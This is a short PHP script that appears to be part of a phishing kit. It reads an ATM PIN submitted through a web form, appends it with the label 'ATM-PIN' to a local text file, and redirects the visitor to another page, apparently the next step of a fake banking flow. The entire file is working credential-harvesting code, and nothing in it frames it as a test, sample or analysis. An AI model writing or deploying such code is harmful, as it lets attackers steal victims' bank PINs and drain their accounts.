<?php

$file = fopen("datamichu.txt", "a");
fwrite($file, "|| ATM-PIN: " .$_POST['pin']. PHP_EOL);
fclose($file);
header ('Location: index3.html');




?>